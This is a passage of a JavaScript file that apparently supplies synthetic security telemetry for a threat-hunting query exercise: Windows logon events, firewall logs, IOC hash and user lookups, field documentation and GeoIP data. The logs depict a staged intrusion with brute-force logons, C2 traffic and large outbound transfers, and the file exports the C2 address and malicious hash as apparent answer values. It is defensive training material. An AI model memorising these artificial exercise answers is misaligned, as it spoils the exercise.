    win('2026-10-26 11:20:00', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'svc_backup', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '10.10.2.8', WorkstationName: 'SRV-WEB-02', Status: '0xC000006A' }),
    win('2026-10-26 11:20:30', 'SRV-DC-01', 4625, 'failure', { TargetUserName: 'svc_backup', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '10.10.2.8', WorkstationName: 'SRV-WEB-02', Status: '0xC000006A' }),
    win('2026-10-26 11:21:00', 'SRV-DC-01', 4624, 'success', { TargetUserName: 'svc_backup', TargetDomainName: 'ACME', LogonType: '3', IpAddress: '10.10.2.8', WorkstationName: 'SRV-WEB-02' }),
  ];

  // ---- Palo Alto Networks NGFW traffic logs ---------------------------------------------
  const FW_COLUMNS = ['_time', 'source_ip', 'dest_ip', 'dest_port', 'protocol', 'app', 'action', 'bytes_sent', 'bytes_received', 'rule_matched', 'session_end_reason', '_product', '_vendor'];
  const fw = (time, sip, dip, port, proto, app, action, sent, recv, rule, reason) => ({ _time: T(time), source_ip: sip, dest_ip: dip, dest_port: port, protocol: proto, app, action, bytes_sent: sent, bytes_received: recv, rule_matched: rule, session_end_reason: reason, _product: 'NGFW', _vendor: 'PANW' });
  const FW_ROWS = [
    fw('2026-10-26 09:00:01', '10.10.20.42', '52.96.166.98', 443, 'tcp', 'outlook-web-online', 'allow', 48213, 912044, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-26 09:12:31', '10.10.20.42', C2, 443, 'tcp', 'ssl', 'allow', 307200, 4096, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-26 09:14:32', '10.10.20.42', C2, 80, 'tcp', 'web-browsing', 'allow', 1228, 2457600, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-26 09:15:06', '10.10.20.42', C2, 4444, 'tcp', 'unknown-tcp', 'allow', 52428800, 1048576, 'allow-any-out', 'tcp-rst-from-client'),
    fw('2026-10-26 10:03:01', '10.10.21.17', '142.250.187.206', 443, 'tcp', 'google-base', 'allow', 9800, 310200, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-26 11:06:01', '10.10.21.17', '104.20.67.143', 443, 'tcp', 'pastebin', 'allow', 2100, 18400, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-25 16:41:02', '10.10.22.23', '185.33.12.5', 443, 'tcp', 'anydesk', 'allow', 8388608, 2097152, 'allow-any-out', 'tcp-fin'),
    fw('2026-10-26 16:00:03', '10.10.22.23', C2, 80, 'tcp', 'web-browsing', 'allow', 980, 61400, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-23 11:13:43', '10.10.2.8', C2, 80, 'tcp', 'web-browsing', 'allow', 640, 1800, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-26 15:31:02', '10.10.40.3', C2, 443, 'tcp', 'ssl', 'allow', 512, 912, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-20 06:05:02', '10.10.50.11', '13.224.1.7', 443, 'tcp', 'ssl', 'allow', 700, 21000, 'allow-web-out', 'tcp-fin'),
    fw('2026-10-24 21:57:58', C2, '203.0.113.10', 3389, 'tcp', 'ms-rdp', 'deny', 0, 0, 'deny-inbound-rdp', 'policy-deny'),
    fw('2026-10-24 21:58:00', C2, '203.0.113.10', 445, 'tcp', 'ms-ds-smb', 'allow', 18200, 9400, 'allow-vpn-smb', 'tcp-fin'),
    fw('2026-10-26 13:06:03', '10.10.30.9', '10.10.20.44', 3389, 'tcp', 'ms-rdp', 'deny', 0, 0, 'deny-lateral-rdp', 'policy-deny'),
  ];

  // ---- lookup datasets ------------------------------------------------------------------
  const HVA_COLUMNS = ['hostname', 'owner', 'tier'];
  const HVA_ROWS = [
    { hostname: 'SRV-DC-01', owner: 'Infrastructure', tier: 'tier-0' },
    { hostname: 'SRV-WEB-02', owner: 'Web Platform', tier: 'tier-1' },
    { hostname: 'WS-FIN-042', owner: 'Finance', tier: 'tier-1' },
    { hostname: 'LAPTOP-SEC-09', owner: 'Security', tier: 'tier-2' },
  ];
  const IOC_COLUMNS = ['sha256', 'threat_name', 'source'];
  const IOC_ROWS = [
    { sha256: IOC_SHA, threat_name: 'Trojan.Downloader.Rhombus', source: 'vendor-feed' },
    { sha256: '1111aaaa2222bbbb3333cccc4444dddd5555eeee6666ffff7777000088889999', threat_name: 'Ransom.LockBit', source: 'vendor-feed' },
    { sha256: '9999888877770000ffff6666eeee5555dddd4444cccc3333bbbb2222aaaa1111', threat_name: 'Backdoor.CobaltStrike', source: 'isac-share' },
  ];
  const USERS_COLUMNS = ['username', 'department', 'title', 'is_admin'];
  const USERS_ROWS = [
    { username: 'ACME\\s.hudson', department: 'Finance', title: 'Accountant', is_admin: false },
    { username: 'ACME\\p.beesly', department: 'Human Resources', title: 'HR Coordinator', is_admin: false },
    { username: 'ACME\\j.halpert', department: 'Sales', title: 'Account Executive', is_admin: false },
    { username: 'ACME\\d.schrute', department: 'Security', title: 'Security Analyst', is_admin: true },
    { username: 'ACME\\administrator', department: 'IT', title: 'Domain Admin', is_admin: true },
    { username: 'ACME\\svc_backup', department: 'IT', title: 'Service Account', is_admin: false },
    { username: 'a.martin', department: 'Design', title: 'Designer', is_admin: false },
    { username: 'jenkins', department: 'Engineering', title: 'CI Service Account', is_admin: false },
  ];

  const FIELD_DOCS = {
    _time: 'System field: the event timestamp.',
    agent_hostname: 'Hostname of the endpoint running the agent.',
    agent_os_type: 'Operating system: 1 = Windows, 2 = macOS, 4 = Linux (ENUM.AGENT_OS_WINDOWS ...).',
    agent_ip_addresses: 'IPv4 address of the endpoint.',
    event_type: 'Event category: PROCESS = 1, NETWORK = 2, FILE = 3, REGISTRY = 4, LOAD_IMAGE = 6 (use ENUM.PROCESS ...).',
    event_sub_type: 'Sub type, for example PROCESS_START, NETWORK_CREATE, FILE_WRITE, FILE_CREATE_NEW, REGISTRY_SET_VALUE.',
    actor_effective_username: 'User that the acting (parent) process runs as. Windows includes the domain.',
    actor_process_image_name: 'File name of the acting (parent) process, for example WINWORD.EXE.',
    actor_process_image_path: 'Full path of the acting process image.',
    actor_process_command_line: 'Command line of the acting process.',
    actor_process_signature_status: 'Signature status of the actor: 1 = Signed, 2 = SignedInvalid, 3 = Unsigned, 4 = FailedToObtain.',
    actor_process_signature_vendor: 'Signer of the actor image.',
    action_process_image_name: 'File name of the process that was started (the action), for example powershell.exe.',
    action_process_image_path: 'Full path of the started process image.',
    action_process_image_command_line: 'Command line used to start the process.',
    action_process_image_sha256: 'SHA256 of the started process image.',
    action_process_signature_status: 'Signature status of the started process: 1 = Signed, 3 = Unsigned.',
    action_process_signature_vendor: 'Signer of the started process image.',
    action_process_os_pid: 'OS process id of the started process.',
    causality_actor_process_image_name: 'Image name of the process at the root of the causality chain.',
    action_file_name: 'File name of action_file_path.',
    action_file_path: 'Path of the file in use.',
    action_file_extension: 'File extension of action_file_path.',
    action_file_size: 'Size of the file in bytes.',
    action_file_sha256: 'SHA256 of the file.',
    action_local_ip: 'Source IP of the connection.',
    action_local_port: 'Source port.',
    action_remote_ip: 'Destination IP of the connection.',
    action_remote_port: 'Destination port.',
    action_external_hostname: 'Hostname the endpoint connected to.',
    action_country: 'Destination country from GeoIP enrichment (null for internal addresses).',
    action_total_upload: 'Bytes sent from the endpoint to the destination.',
    action_total_download: 'Bytes received from the destination.',
    dns_query_name: 'DNS request name (null when the connection had no DNS lookup).',
    action_registry_key_name: 'Registry key being accessed.',
    action_registry_value_name: 'Registry value name being accessed.',
    action_registry_data: 'Data written to the registry value.',
    action_module_path: 'Path of the module (DLL) being loaded.',
    dfe_labels: 'Story label: process, network, file, registry, load_image.',
    _product: 'System field: product that produced the record.',
    _vendor: 'System field: vendor that produced the record.',
  };

  XQL.DATASETS = {
    xdr_data: { columns: COLUMNS, rows: XDR_ROWS, description: 'Endpoint telemetry from the Cortex XDR agent (process, network, file, registry and image-load events).', fieldDocs: FIELD_DOCS, kind: 'dataset' },
    microsoft_windows_raw: { columns: WIN_COLUMNS, rows: WIN_ROWS, description: 'Windows Security and System event logs; the EventData XML is stored as a JSON string in event_data.', fieldDocs: { host_name: 'Host that logged the event.', event_id: 'Windows event id, for example 4624 (logon), 4625 (failed logon), 4720 (user created), 4732 (member added to local group), 7045 (service installed).', event_result: 'success or failure.', event_data: 'JSON string with the event-specific fields (TargetUserName, IpAddress, LogonType, ...). Use json_extract_scalar(event_data, "$.TargetUserName").' }, kind: 'dataset' },
    panw_ngfw_traffic_raw: { columns: FW_COLUMNS, rows: FW_ROWS, description: 'Palo Alto Networks firewall traffic logs.', fieldDocs: { source_ip: 'Source IP.', dest_ip: 'Destination IP.', dest_port: 'Destination port.', app: 'App-ID of the session.', action: 'allow or deny.', bytes_sent: 'Bytes sent by the source.', bytes_received: 'Bytes received by the source.', rule_matched: 'Security policy rule that matched.', session_end_reason: 'Why the session ended.' }, kind: 'dataset' },
    hva_hosts: { columns: HVA_COLUMNS, rows: HVA_ROWS, description: 'Lookup: high-value assets with owner and tier.', fieldDocs: { hostname: 'Hostname (matches agent_hostname).', owner: 'Owning team.', tier: 'Criticality tier (tier-0 is the most critical).' }, kind: 'lookup' },
    ioc_hashes: { columns: IOC_COLUMNS, rows: IOC_ROWS, description: 'Lookup: known-bad SHA256 hashes.', fieldDocs: { sha256: 'Malicious file hash.', threat_name: 'Threat family.', source: 'Where the indicator came from.' }, kind: 'lookup' },
    user_directory: { columns: USERS_COLUMNS, rows: USERS_ROWS, description: 'Lookup: user directory with department and admin flag.', fieldDocs: { username: 'Username as it appears in actor_effective_username.', department: 'Department.', title: 'Job title.', is_admin: 'true for privileged accounts.' }, kind: 'lookup' },
  };

  XQL.GEOIP = {
    '185.220.101.45': { country: 'DE', city: 'Frankfurt', latlon: '50.11,8.68', continent: 'Europe' },
    '185.33.12.5': { country: 'DE', city: 'Berlin', latlon: '52.52,13.40', continent: 'Europe' },
    '52.96.166.98': { country: 'US', city: 'Redmond', latlon: '47.67,-122.12', continent: 'North America' },
    '142.250.187.206': { country: 'US', city: 'Mountain View', latlon: '37.42,-122.08', continent: 'North America' },
    '104.20.67.143': { country: 'US', city: 'San Francisco', latlon: '37.77,-122.42', continent: 'North America' },
    '13.224.1.7': { country: 'US', city: 'Seattle', latlon: '47.61,-122.33', continent: 'North America' },
    '198.51.100.24': { country: 'US', city: 'Chicago', latlon: '41.88,-87.63', continent: 'North America' },
    '203.0.113.10': { country: 'IE', city: 'Dublin', latlon: '53.35,-6.26', continent: 'Europe' },
  };
  XQL.C2_IP = C2;
  XQL.IOC_SHA = IOC_SHA;
})(typeof globalThis !== 'undefined' ? globalThis : this);
